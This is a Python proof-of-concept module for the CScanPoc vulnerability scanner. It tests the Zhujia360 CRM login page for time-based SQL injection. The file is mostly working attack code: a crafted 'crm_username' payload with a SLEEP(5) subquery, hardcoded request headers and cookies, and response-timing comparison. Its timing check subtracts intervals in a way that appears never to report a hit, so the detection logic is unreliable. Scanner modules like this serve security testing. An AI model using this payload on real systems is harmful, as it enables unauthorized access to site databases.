# coding:utf-8
import time
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Zhujia360_0101'  # 平台漏洞编号
    name = '筑家易sql显错注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-05-09'  # 漏洞公布时间
    desc = '''
    筑家易sql显错注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=204248'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zhujia360'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '33323a65-30c8-4fd4-9994-5169716b8e43'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + "/crm.php?r=login"
            payload = "crm_username=admin'; (SELECT * FROM(SELECT(SLEEP(5)))QnRk)#&crm_password=adddddd&type=1"
            payload1 = "crm_username=admin&crm_password=adddddd&type=1"
            headers = {
                "Proxy-Connection": "keep-alive",
                "Content-Length": "49",
                "Cache-Control": "max-age=0",
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Encoding": "gzip,deflate,sdch",
                "Accept-Language": "zh-CN,zh;q=0.8",
                "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",
                "Cookie": "pgv_pvi=2130885632; pgv_si=s5457464320; Hm_lvt_9e13e5b8187600e94464992b615a65ee=1462081561,1462081577,1462082892; Hm_lpvt_9e13e5b8187600e94464992b615a65ee=1462084640"
            }
            start_time1 = time.time()
            _response = requests.post(url, data=payload, headers=headers)
            end_time1 = time.time()
            _response1 = requests.post(url, data=payload1, headers=headers)
            end_time2 = time.time()
            if (end_time1-start_time1) - (end_time2-start_time1) >= 5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
